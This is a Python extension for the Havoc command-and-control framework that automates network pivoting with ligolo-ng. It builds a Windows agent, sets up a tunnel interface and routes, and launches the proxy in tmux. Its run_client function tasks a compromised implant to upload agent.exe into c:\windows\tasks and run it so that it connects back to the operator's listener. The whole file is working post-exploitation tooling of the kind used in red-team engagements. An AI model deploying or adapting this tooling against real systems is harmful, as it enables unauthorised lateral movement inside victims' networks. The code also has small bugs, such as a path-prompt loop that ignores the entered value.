#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Made by papi
# Created on: Sat 09 Dec 2023 09:17:18 PM CET
# ligolo.py
# Description:
#  A plugin for havoc to connect through ligolo and pivot inside of a network in
#  a easy to use way for good pivot rates ^^ it supports multiple network ranges
#  and so on.
# commands:
#  ligo build:
#   build agent -> GOOS=windows go build -o agent.exe cmd/agent/main.go
#   build proxy -> go build -o proxy cmd/proxy/main.go
#  set network:
#   sudo ip tuntap add user $(whoami) mode tun ligolo
#   sudo ip link set ligolo up
#   sudo ip route add 192.168.0.0/24 dev ligolo
# dependencies:
#  -go
#  -tmux
#  -kdesu


import havoc, havocui
import os
import subprocess
from shutil import which

current_dir = os.getcwd()
install_path = "/data/extensions/havoc-ligolo/"

while not os.path.exists(current_dir + install_path):
    # not installed through havoc-store so prompt for the path
    install_path = ""
    havocui.inputdialog("Install path", "Please enter your install path here for the module to work correctly:")

settings_pane = havocui.Widget("Settings", True)
proxy_bin = current_dir + install_path + "ligolo-ng/proxy"
agent_bin = current_dir + install_path + "ligolo-ng/agent.exe"
arguments = "-selfcert -laddr %s:%s"
tmux_session_for_server = "ligolo_server_havoc"
settings = {
    "ip_addr": "0.0.0.0",
    "port": "1234",
    "ranges": []
}

# Functions for the GUI to manage the global dic
def set_ip_listener(addr):
    global settings
    settings["ip_addr"] = addr
def set_port_listener(port):
    global settings
    settings["port"] = port
def run_save():
    # A function that does nothing but to actually have the events trigger
    # on the Line Edits you need to focus out of the text box this is for that
    return

# Actural GUI stuff for settings
def open_settings():
    global settings
    settings_pane.clear()
    settings_pane.addLabel("<h3 style='color:#bd93f9'>Settings:</h3>")
    settings_pane.addLabel("<span style='color:#71e0cb'>Listener ip address:</span>")
    settings_pane.addLineedit(settings["ip_addr"], set_ip_listener)
    settings_pane.addLabel("<span style='color:#71e0cb'>Listener port:</span>")
    settings_pane.addLineedit(settings["port"], set_port_listener)
    settings_pane.addButton("Save", run_save)
    settings_pane.setSmallTab()

# function to check if the server is running in the background
def is_server_ligolo_running():
    try:
        output = subprocess.check_output(['tmux', 'list-sessions'], universal_newlines=True)
        return tmux_session_for_server in output
    except subprocess.CalledProcessError:
        return False

# This function will setup the interface for the port forward and run the server
# inside of a tmux session to then be interacted with if needed.
def start_server():
    if len(settings["ranges"]) == 0:
        havocui.errormessage("There are no ranges present inside of the plugin!\nPlease add ranges through Ligolo>Add IP range!")
        return
    if "0.0.0.0" == settings["ip_addr"]:
        havocui.errormessage("Your listener ip address is set as 0.0.0.0 which is not possible to connect back to! Please set it to your ip address.")
        return
    os.system("kdesu -c \"ip tuntap add user $(whoami) mode tun ligolo\"")
    os.system("kdesu -c \"ip link set ligolo up\"")
    for cidr in settings["ranges"]:
        os.system("kdesu -c \"ip route add %s dev ligolo\"" % cidr.decode('ascii'))
    if is_server_ligolo_running() == False:
        processed_args = arguments % (settings["ip_addr"], settings["port"])
        os.system("tmux new-session -d -s %s" % tmux_session_for_server)
        os.system("tmux send-keys -t %s \"%s %s\" C-m" % (tmux_session_for_server, proxy_bin, processed_args))
        havocui.messagebox("Important!", "You can now connect to the ligolo server using the command: tmux a -t ligolo_server_havoc")

def add_ip_range():
    ip_range = havocui.inputdialog("Enter IP range", "Provide the IP range to be added to the interface with the CIDR notation:")
    settings["ranges"].append(ip_range)
    if is_server_ligolo_running() == True:
        os.system("kdesu -c \"ip route add %s dev ligolo\"" % ip_range)

def run_client(demonID, *param):
    if is_server_ligolo_running() == False:
        havocui.errormessage("Your server is not running so the command will not run")
        return
    if "0.0.0.0" == settings["ip_addr"]:
        havocui.errormessage("Your listener ip address is set as 0.0.0.0 which is not possible to connect back to! Please set it to your ip address.")
        return
    TaskID : str = None
    demon : Demon = None

    demon = Demon(demonID)
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked demon to connect back to the ligolo server running on %s:%s" % (settings["ip_addr"], settings["port"]) )
    demon.Command(TaskID, "cd c:\\windows\\tasks")
    demon.Command(TaskID, "upload %s" % (agent_bin))
    demon.Command(TaskID, "shell .\\agent.exe -connect %s:%s -ignore-cert" % (settings["ip_addr"], settings["port"]))
    # once I get that working
    #demon.Command(TaskID, "noconsolation %s -connect %s:%s -ignore-cert" % (agent_bin, settings["ip_addr"], settings["port"]))

if which("go") == None or which("tmux") == None or which("kdesu") == None:
    havocui.errormessage("You are missing one of these dependencies: go, tmux, kdesu.\nPlease install them and restart havoc to use the ligolo extension.")
else:
    if not os.path.exists(agent_bin) or not os.path.exists(proxy_bin):
        os.chdir("%sligolo-ng/" % (current_dir + install_path))
        os.system("GOOS=windows go build -o agent.exe cmd/agent/main.go")
        os.system("go build -o proxy cmd/proxy/main.go")
        os.chdir(current_dir)
    havoc.RegisterCommand( run_client, "", "ligolo-ng", "Connect back to the ligolo server.", 0, "", "" )
    havocui.createtab("Ligolo", "Start server", start_server, "Add IP range", add_ip_range, "Settings", open_settings)
